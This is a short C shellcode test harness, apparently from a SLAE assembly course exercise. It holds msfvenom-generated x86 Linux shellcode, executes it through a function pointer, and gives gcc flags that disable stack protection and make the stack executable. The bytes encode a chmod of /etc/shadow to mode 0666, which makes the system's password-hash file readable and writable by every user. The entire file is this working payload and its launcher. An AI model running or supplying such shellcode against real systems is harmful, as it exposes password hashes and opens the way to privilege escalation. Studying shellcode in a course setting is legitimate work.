// Filename: shellcode2.c
// Author:  SLAE-935
//
// Shellcode: msfvenom -p linux/x86/chmod --arch x86 --platform linux -f c

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
void main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode2